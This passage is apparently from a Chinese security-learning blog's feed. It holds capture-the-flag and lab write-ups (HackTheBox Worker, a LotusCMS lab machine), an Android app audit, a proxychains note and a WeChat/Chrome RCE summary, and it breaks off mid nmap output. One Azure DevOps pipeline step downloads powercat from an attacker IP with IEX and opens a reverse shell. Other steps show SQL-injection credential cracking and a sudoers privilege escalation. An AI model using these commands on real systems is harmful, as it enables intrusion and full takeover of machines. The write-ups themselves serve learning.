+<p>使用evil-winrm连接，得到robisl的shell，userflag在桌面文件夹里</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1glzwynazxpj30xw0bwjsk.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1glzwynazxpj30xw0bwjsk.jpg" alt="image-20201225105450219"></a></p>
+<h3 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h3><p>这里尝试了winpeas、powerup等脚本，都没有什么能利用的点，systeminfo是没有权限执行的，看了论坛，提示说要回去看看，使用robisl账号登录devops，依旧看不出有什么利用的地方，这里又作弊了，看了群里大哥的writeup，发现是需要自己写一个pipeline（管道？）我理解的大概意思应该是写一个管道连接协议，类似ssh隧道？真的搞不懂了</p>
+<p>这里照抄大哥的writeup</p>
+<blockquote>
+<p>在下面路径 New Pipeline &gt; Azure Repos Git &gt; PartsUnlimited &gt; Starter Pipeline 新建一个pipeline，在pipeline的编辑界面需要删除</p>
+<figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="symbol">pool:</span> <span class="comment">&#x27;Default&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为在服务器环境下并没有这个pool，从而会导致运行失败，最后在 -script 这一行换成我们自己的命令，如下：</p>
+<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">trigger:</span><br><span class="line"></span><br><span class="line">- master</span><br><span class="line"></span><br><span class="line">steps:</span><br><span class="line"></span><br><span class="line">- script: powershell IEX (New-Object System.<span class="keyword">Net</span>.Webclient).DownloadString(&#x27;http:<span class="comment">//10.10.16.4:8899/powercat.ps1&#x27;); powercat -c 10.10.16.4 -p 9988 -e cmd</span></span><br><span class="line">  displayName: &#x27;<span class="keyword">Run</span> a <span class="keyword">one</span>-<span class="keyword">line</span> script&#x27;</span><br><span class="line"></span><br><span class="line">- script: |</span><br><span class="line">  echo Add other tasks to build, <span class="keyword">test</span>, and deploy your project.</span><br><span class="line">  echo See https:<span class="comment">//aka.ms/yaml</span></span><br><span class="line">  displayName: &#x27;<span class="keyword">Run</span> a multi-<span class="keyword">line</span> script&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>本地起个nc监听就可以获取到system的shell了，成功get root shell！</p>
+</blockquote>
+<p>到此为止确实是拿到了system权限，但还是有问题，我们看flag的速度必须快，要不然1～2分钟后我们的管道又会被删除，导致shell断开，很麻烦，我想应该可以在get system之后再单独powercat弹一个shell回来，应该就解决了。</p>
+<p>从初识svn服务到拿到azure devops账号，再学习git push，再到最简单的图形化界面pull requests，最后利用编写piplines功能get system，要不是有别人帮助，自己还真搞不来。以后要学习的还有很多啊。。。</p>
+<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>HackTheBox—Worker <a href="https://chen1sheng.github.io/2020/11/11/%E9%9D%B6%E6%9C%BAs/worker/">https://chen1sheng.github.io/2020/11/11/%E9%9D%B6%E6%9C%BAs/worker/</a></p>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/11/04/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>proxychains代理</title>
+    <url>/2021/11/04/proxychains%E4%BB%A3%E7%90%86/</url>
+    <content><![CDATA[<p>Linux中叫proxychains，MacOS中叫proxychains-ng</p>
+<h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>proxychains-ng</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h5 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sudo vim <span class="regexp">/usr/</span>local<span class="regexp">/etc/</span>proxychains.conf</span><br><span class="line"><span class="comment">##Linux中的路径为/etc/proxychains.conf##</span></span><br><span class="line"></span><br><span class="line">[ProxyList]</span><br><span class="line"><span class="comment"># add proxy here ...</span></span><br><span class="line"><span class="comment"># meanwile</span></span><br><span class="line"><span class="comment"># defaults set to &quot;tor&quot;</span></span><br><span class="line">socks5 	<span class="number">172.16</span>.<span class="number">47.1</span> <span class="number">9050</span></span><br></pre></td></tr></table></figure>
+
+<p>如果出现如下错误，需要将配置中的proxyDNS注释掉</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpdhipu5zbj31d20ngdml.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpdhipu5zbj31d20ngdml.jpg" alt="image-20210409143925240"></a></p>
+]]></content>
+      <tags>
+        <tag>Tools</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>微信+Chrome RCE复现</title>
+    <url>/2021/11/04/%E5%BE%AE%E4%BF%A1-Chrome-RCE%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<p>This exploit originated from a chrome kernel browser vulnerability POC leaked by a user named r4j0x00 on GitHub.</p>
+<p><a href="https://github.com/r4j0x00/exploits">https://github.com/r4j0x00/exploits</a></p>
+<p>Then the researchers find out it can be exploitable on WeChat web server, because WeChat has always used the low version of the chrome kernel to access the url page in the application.</p>
+<span id="more"></span>
+
+<h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept"></a>Proof of Concept</h2><p>Let’s check the POC first. Install the chrome which version of browser &lt;= 89.0.4389.114, then use —no-sandbox mode to run it.</p>
+<p>Access the exploit html page, we will see the calc.exe run on the screen.</p>
+<h2 id="Exploit-with-WeChat"><a href="#Exploit-with-WeChat" class="headerlink" title="Exploit with WeChat"></a>Exploit with WeChat</h2><p>Edit exploit.js</p>
+<p><a href="https://tva1.sinaimg.cn/large/008i3skNly1gprh4o32s5j30m4090750.jpg"><img src="https://tva1.sinaimg.cn/large/008i3skNly1gprh4o32s5j30m4090750.jpg" alt="image-20210421170257029"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008i3skNly1gprh3pxaelj31ak09idho.jpg"><img src="https://tva1.sinaimg.cn/large/008i3skNly1gprh3pxaelj31ak09idho.jpg" alt="image-20210421170253169"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008i3skNly1gprivmfiiij31400u0tco.jpg"><img src="https://tva1.sinaimg.cn/large/008i3skNly1gprivmfiiij31400u0tco.jpg" alt="image-20210421180421342"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008i3skNly1gprlvm9x4gj31mc0u0k1l.jpg"><img src="https://tva1.sinaimg.cn/large/008i3skNly1gprlvm9x4gj31mc0u0k1l.jpg" alt="image-20210421194809105"></a></p>
+]]></content>
+      <tags>
+        <tag>Vulns</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>某APP的安全测试</title>
+    <url>/2021/11/04/%E6%9F%90APP%E7%9A%84%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<h2 id="安全审计"><a href="#安全审计" class="headerlink" title="安全审计"></a>安全审计</h2><h5 id="验证apk安装包是否合规"><a href="#验证apk安装包是否合规" class="headerlink" title="验证apk安装包是否合规"></a>验证apk安装包是否合规</h5><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpo1q82uomj30oo08cgmq.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpo1q82uomj30oo08cgmq.jpg" alt="image-20210418175418559"></a></p>
+<p>签名正常，下面的警 告是因为签名密钥不在本地密钥库中。</p>
+<span id="more"></span>
+
+<h5 id="签名者证书信息"><a href="#签名者证书信息" class="headerlink" title="签名者证书信息"></a>签名者证书信息</h5><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpo1q2ghg8j31de062q4e.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpo1q2ghg8j31de062q4e.jpg" alt="image-20210418175409103"></a></p>
+<h5 id="应用基本信息"><a href="#应用基本信息" class="headerlink" title="应用基本信息"></a>应用基本信息</h5><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpo1q5eq34j31c50u0n46.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpo1q5eq34j31c50u0n46.jpg" alt="image-20210418175413666"></a></p>
+<h5 id="查看AndroidManifest-xml"><a href="#查看AndroidManifest-xml" class="headerlink" title="查看AndroidManifest.xml"></a>查看AndroidManifest.xml</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">java -jar ..<span class="regexp">/SecTools/</span>Android-GetAPKInfo<span class="regexp">/AXMLPrinter2.jar ./</span>AndroidManifest.xml &gt;&gt; axml.txt</span><br><span class="line">cat axml.txt</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpow4ezq43j315v0u0796.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpow4ezq43j315v0u0796.jpg" alt="image-20210419112554385"></a></p>
+<h5 id="sharedUserid-检测"><a href="#sharedUserid-检测" class="headerlink" title="sharedUserid 检测"></a>sharedUserid 检测</h5><p>AndroidManifest.xml中不存在sharedUserid字符串</p>
+<h5 id="allowBackup-标志检测"><a href="#allowBackup-标志检测" class="headerlink" title="allowBackup 标志检测"></a>allowBackup 标志检测</h5><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpp2o37ilpj31710u0478.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpp2o37ilpj31710u0478.jpg" alt="image-20210419151224239"></a></p>
+<p>allowBackup为true（默认为true）</p>
+<p>当 allowBackup 被设置成 true 或不设置该标志 位时，应用程序数据可以备份和恢复，adb调试备份允许恶意攻击者复制应用程序数据</p>
+<p>修复建议:设置 AndroidManifest.xml 的 Android:allowBackup 标志为 false</p>
+<h5 id="日志数据泄漏风险"><a href="#日志数据泄漏风险" class="headerlink" title="日志数据泄漏风险"></a>日志数据泄漏风险</h5><p>获取反编译输出目录下所有 smali 文件,从文件内容中查找“Landroid/util/Log;-&gt;”或者 “Ljava/lang/System;-&gt;out:Ljava/io/PrintStream”或 者“Ljava/lang/System;-&gt;err:Ljava/io/PrintStream” 字符串，查找到说明存在日志数据泄露</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpp38wxly9j30xa0u0ws0.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpp38wxly9j30xa0u0ws0.jpg" alt="image-20210419153225094"></a></p>
+<p>在 APP 的开发过程中，为了方便调试，通常会 使用 log 函数输出一些关键流程的信息，这些信息中通常 会包含敏感内容，如执行流程、明文的用户名密码等，如 果将未关闭调试信息的应用发版，这会让攻击者根据日志 信息更加容易的了解 APP 代码流程便于破解和攻击，甚至 直接从日志中获取到有价值的用户敏感信息。</p>
+<p>如果调试日志信息未关闭，对于恶意攻击者可以根据日志信息可以分析出业务逻辑，进行利用与攻击。</p>
+<p>修复方案:发布版本之前，确认关闭调试日志函数调用， 或者确保日志的输出使用了正确的级别，涉及敏感数据的 日志信息在发布版本中关闭</p>
+<h5 id="WebView-远程命令执行漏洞"><a href="#WebView-远程命令执行漏洞" class="headerlink" title="WebView 远程命令执行漏洞"></a>WebView 远程命令执行漏洞</h5><p>minSdkVersion=”16”，但未找到“Landroid/webkit/WebView;-&gt;addJavascriptInterface( Ljava/lang/Object; Ljava/lang/String;)”字符串</p>
+<p>如果查找到字符串，说明存在风险。</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpp4d7ayzbj31300bmta2.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpp4d7ayzbj31300bmta2.jpg" alt="image-20210419161109133"></a></p>
+<h5 id="so文件加壳检测"><a href="#so文件加壳检测" class="headerlink" title="so文件加壳检测"></a>so文件加壳检测</h5><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpo1pz2pwqj313a03qjsv.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpo1pz2pwqj313a03qjsv.jpg" alt="image-20210418175401269"></a></p>
+<p>libcocos2d.so未加壳</p>
+<h5 id="判断混淆"><a href="#判断混淆" class="headerlink" title="判断混淆"></a>判断混淆</h5><p>解压apk，使用dex2jar，导出class.dex为jar文件，而后使用jd-gui查看</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpox66dxrhj31zo0iegq8.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpox66dxrhj31zo0iegq8.jpg" alt="image-20210419120211413"></a></p>
+<p>方法名均为abcd这种无意义的名称，判断为代码被混淆</p>
+<h5 id="搜索危险关键字"><a href="#搜索危险关键字" class="headerlink" title="搜索危险关键字"></a>搜索危险关键字</h5><p>在源代码中分别搜索关键字key,username,password,http</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpoxqwy6wbj30v00j4q4z.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpoxqwy6wbj30v00j4q4z.jpg" alt="image-20210419122208131"></a></p>
+<p>看名称推断为微信支付接口</p>
+<h2 id="组件安全测试"><a href="#组件安全测试" class="headerlink" title="组件安全测试"></a>组件安全测试</h2><h4 id="使用drozer进行攻击测试"><a href="#使用drozer进行攻击测试" class="headerlink" title="使用drozer进行攻击测试"></a>使用drozer进行攻击测试</h4><h5 id="查看包名"><a href="#查看包名" class="headerlink" title="查看包名"></a>查看包名</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="builtin-name">run</span> app.package.list</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpousvlb1cj30v60eetcb.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpousvlb1cj30v60eetcb.jpg" alt="image-20210419104013443"></a></p>
+<h5 id="列举攻击面"><a href="#列举攻击面" class="headerlink" title="列举攻击面"></a>列举攻击面</h5><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">run app<span class="selector-class">.package</span><span class="selector-class">.attacksurface</span> com<span class="selector-class">.client</span>.qipai</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpouusaghzj30o4078aay.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpouusaghzj30o4078aay.jpg" alt="image-20210419104203104"></a></p>
+<p>可以看到存在2个activity攻击面</p>
+<h5 id="查看详细信息"><a href="#查看详细信息" class="headerlink" title="查看详细信息"></a>查看详细信息</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="builtin-name">run</span> app.activity.<span class="builtin-name">info</span> -a com.client.qipai</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpovy733g4j30nu07q757.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpovy733g4j30nu07q757.jpg" alt="image-20210419111955710"></a></p>
+<p>能看到两个activity的名称，在AndroidManifest.xml中可以找到</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpovydt3ymj310g0qk42f.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpovydt3ymj310g0qk42f.jpg" alt="image-20210419104514958"></a></p>
+<h5 id="启动暴露的组件"><a href="#启动暴露的组件" class="headerlink" title="启动暴露的组件"></a>启动暴露的组件</h5><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">run app<span class="selector-class">.activity</span><span class="selector-class">.start</span> --component com<span class="selector-class">.client</span><span class="selector-class">.qipai</span> org<span class="selector-class">.cocos2dx</span><span class="selector-class">.lua</span>.AppActivity</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpovaendzrj31gj0u01kz.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpovaendzrj31gj0u01kz.jpg" alt="image-20210419105704277"></a></p>
+<p>正常启动了app</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">run app<span class="selector-class">.activity</span><span class="selector-class">.start</span> --component com<span class="selector-class">.client</span><span class="selector-class">.qipai</span> com<span class="selector-class">.client</span><span class="selector-class">.qipai</span><span class="selector-class">.wxapi</span>.WXEntryActivity</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpovyj3qn7j31gj0u01kx.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpovyj3qn7j31gj0u01kx.jpg" alt="image-20210419104713087"></a></p>
+<p>看名称，这里的activity应该是一个调用wx登录的接口，猜想可能是因为功能还未完善，这里界面中并没有微信登录的选项，所以导致程序意外停止</p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>利用burp抓包，远程校验签名错误</p>
+<p><a href="https://tva1.sinaimg.cn/large/008i3skNgy1gq8s9cl5dqj315p0u07wi.jpg"><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq8s9cl5dqj315p0u07wi.jpg" alt="image-20210506162332422"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008i3skNgy1gq8s8s7rcfj31pu0k8dkm.jpg"><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gq8s8s7rcfj31pu0k8dkm.jpg" alt="image-20210506162257873"></a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>安装包签名正常、证书正常，allowBackup属性为true（建议设置为false），存在日志数据泄漏风险，libcocos2d未加壳，代码经过混淆，不存在WebView 远程命令执行漏洞</p>
+<p>组件扫描中暴露两个接口，但未发现安全风险</p>
+<p>抓包测试时注册、登录均显示远程服务器校验签名错误，未找到其他登录入口</p>
+<p>由于目前该app属于测试版，功能还不够完善，渗透测试部分由于签名错误无法测试</p>
+]]></content>
+      <tags>
+        <tag>Pentest-Learning</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>某靶场writeup</title>
+    <url>/2021/11/04/%E6%9F%90%E9%9D%B6%E5%9C%BAwriteup/</url>
+    <content><![CDATA[<h3 id="192-168-100-187"><a href="#192-168-100-187" class="headerlink" title="192.168.100.187"></a>192.168.100.187</h3><h4 id="Information-gathering"><a href="#Information-gathering" class="headerlink" title="Information gathering"></a>Information gathering</h4><p>nmap扫了一下存活</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8hgwzr1j30pm0pydne.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8hgwzr1j30pm0pydne.jpg" alt="image-20210114150127187"></a></p>
+<span id="more"></span>
+
+<p>从下往上一台一台看吧，187</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8ipi5j2j30k2070t9m.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8ipi5j2j30k2070t9m.jpg" alt="image-20210114150242045"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8j9tw97j315k0m6mzi.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8j9tw97j315k0m6mzi.jpg" alt="image-20210114150313595"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8jgsdsej30mg0im0ts.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8jgsdsej30mg0im0ts.jpg" alt="image-20210114150326277"></a></p>
+<h4 id="Enumeration-amp-getshell"><a href="#Enumeration-amp-getshell" class="headerlink" title="Enumeration &amp; getshell"></a>Enumeration &amp; getshell</h4><p>可以看到LotusCMS字样，搜索后发现3.0登录界面一致，存在RCE漏洞</p>
+<p><a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit">https://github.com/Hood3dRob1n/LotusCMS-Exploit</a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8kxt17bj30ts0sydj1.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8kxt17bj30ts0sydj1.jpg" alt="image-20210114150449790"></a></p>
+<p>得到一个不稳定的shell</p>
+<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8psmd8tj30o805wdgo.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmn8psmd8tj30o805wdgo.jpg" alt="image-20210114150930534"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmne1gu0r3j30vz0u0wl4.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmne1gu0r3j30vz0u0wl4.jpg" alt="image-20210114181342877"></a></p>
+<p>home目录下loneferret存在.sudo_as_admin_successful文件，判断存在sudo权限</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmne2ur9i3j30wq0fy0w0.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmne2ur9i3j30wq0fy0w0.jpg" alt="image-20210114181503377"></a></p>
+<h4 id="User-shell"><a href="#User-shell" class="headerlink" title="User shell"></a>User shell</h4><p>翻看了目录，找到了一个admin的hash，由于shell一直不能运行linpeas，</p>
+<p>翻看网上资料，发现/gallery/gallery.php有处注入，还是自己不仔细呀，下次一定要更仔细一点才行</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmndwdecjrj30wo0ci400.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmndwdecjrj30wo0ci400.jpg" alt="image-20210114180849365"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmndy2eefdj30uc08k0ts.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmndy2eefdj30uc08k0ts.jpg" alt="image-20210114181027363"></a></p>
+<p>第一个表gallerific_users里面的账号密码暂时没发现怎么用</p>
+<p>第二个表dev_accouts里面爆出了之前我们看到的两个本地用户dreg和loneferret，sqlmap自带的字典就能爆出md5</p>
+<p>ssh使用密码starwars连接loneferret，成功<strong>（老emo人+星战粉了💔</strong></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmne52myyoj30oo030jrs.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmne52myyoj30oo030jrs.jpg" alt="image-20210114181711360"></a></p>
+<h4 id="Root-shell"><a href="#Root-shell" class="headerlink" title="Root shell"></a>Root shell</h4><p>查看拥有哪些sudo权限，发现这里有ht，一款编辑器</p>
+<p>[<img src="https://fre4k5en.me/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20210118102507007.png" alt="image-20210118102507007">](<a href="https://fre4k5en.me/Users/fre4k5en/Library/Application">https://fre4k5en.me/Users/fre4k5en/Library/Application</a> Support/typora-user-images/image-20210118102507007.png)</p>
+<p>直接执行</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sudo <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>ht</span><br></pre></td></tr></table></figure>
+
+<p>会报错，这里我们把终端换为xterm</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmrvod9ikvj30n803saat.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmrvod9ikvj30n803saat.jpg" alt="image-20210118152610648"></a></p>
+<p>使用ht编辑我们的sudoers，增加一个/bin/bash</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmrn184d6ej30vs0regp7.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmrn184d6ej30vs0regp7.jpg" alt="image-20210118102708366"></a></p>
+<p>F2保存F10退出，而后执行</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sudo <span class="regexp">/bin/</span>bash</span><br></pre></td></tr></table></figure>
+
+<p>成功get root shell</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmrn363j5rj30hu03qaam.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmrn363j5rj30hu03qaam.jpg" alt="image-20210118102901010"></a></p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">arp -<span class="selector-tag">a</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gmrvt4mwhej30oq01u74j.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gmrvt4mwhej30oq01u74j.jpg" alt="image-20210118153045267"></a></p>
+<p>没有找到arp表中其它机器</p>
+<hr>
+<h3 id="192-168-100-175"><a href="#192-168-100-175" class="headerlink" title="192.168.100.175"></a>192.168.100.175</h3><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="selector-tag">Starting</span> <span class="selector-tag">Nmap</span> <span class="selector-tag">7</span><span class="selector-class">.91</span> ( <span class="attribute">https</span>:<span class="comment">//nmap.org ) at 2021-01-18 15:32 CST</span></span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">100.175</span></span><br><span class="line">Host is up (<span class="number">0.072s</span> latency).</span><br><span class="line">Not <span class="attribute">shown</span>: <span class="number">988</span> closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line"><span class="number">21</span>/tcp   open  ftp         ProFTPD <span class="number">1.3</span>.<span class="number">1</span></span><br><span class="line"><span class="number">22</span>/tcp   open  ssh         OpenSSH <span class="number">4.7</span>p1 Debian <span class="number">8</span>ubuntu1 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="attribute">ssh-hostkey</span>:</span><br><span class="line">|   <span class="number">1024</span> <span class="number">60</span>:<span class="number">0</span><span class="attribute">f</span>:<span class="attribute">cf</span>:<span class="attribute">e1</span>:<span class="attribute">c0</span>:<span class="number">5</span><span class="attribute">f</span>:<span class="number">6</span><span class="attribute">a</span>:<span class="number">74</span>:<span class="attribute">d6</span>:<span class="number">90</span>:<span class="number">24</span>:<span class="attribute">fa</span>:<span class="attribute">c4</span>:<span class="attribute">d5</span>:<span class="number">6</span><span class="attribute">c</span>:cd (DSA)</span><br><span class="line">|_  <span class="number">2048</span> <span class="number">56</span>:<span class="number">56</span>:<span class="number">24</span>:<span class="number">0</span><span class="attribute">f</span>:<span class="number">21</span>:<span class="number">1</span><span class="attribute">d</span>:<span class="attribute">de</span>:<span class="attribute">a7</span>:<span class="number">2</span><span class="attribute">b</span>:<span class="attribute">ae</span>:<span class="number">61</span>:<span class="attribute">b1</span>:<span class="number">24</span>:<span class="number">3</span><span class="attribute">d</span>:<span class="attribute">e8</span>:f3 (RSA)</span><br><span class="line"><span class="number">23</span>/tcp   open  telnet      Linux telnetd</span><br><span class="line"><span class="number">25</span>/tcp   open  smtp        Postfix smtpd</span><br><span class="line">|<span class="attribute">_smtp-commands</span>: metasploitable.localdomain, PIPELINING, SIZE <span class="number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, <span class="number">8</span>BITMIME, DSN,</span><br><span class="line"><span class="number">53</span>/tcp   open  domain      ISC BIND <span class="number">9.4</span>.<span class="number">2</span></span><br><span class="line">| <span class="attribute">dns-nsid</span>:</span><br><span class="line">|_  bind.<span class="attribute">version</span>: <span class="number">9.4</span>.<span class="number">2</span></span><br><span class="line"><span class="number">80</span>/tcp   open  http        Apache httpd <span class="number">2.2</span>.<span class="number">8</span> ((Ubuntu) PHP/<span class="number">5.2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5.<span class="number">10</span> with Suhosin-Patch)</span><br><span class="line">| <span class="attribute">http-methods</span>:</span><br><span class="line">|_  Potentially risky <span class="attribute">methods</span>: TRACE</span><br><span class="line">|<span class="attribute">_http-server-header</span>: Apache/<span class="number">2.2</span>.<span class="number">8</span> (Ubuntu) PHP/<span class="number">5.2</span>.<span class="number">4</span>-<span class="number">2</span>ubuntu5.<span class="number">10</span> with Suhosin-Patch</span><br><span class="line">|<span class="attribute">_http-title</span>: 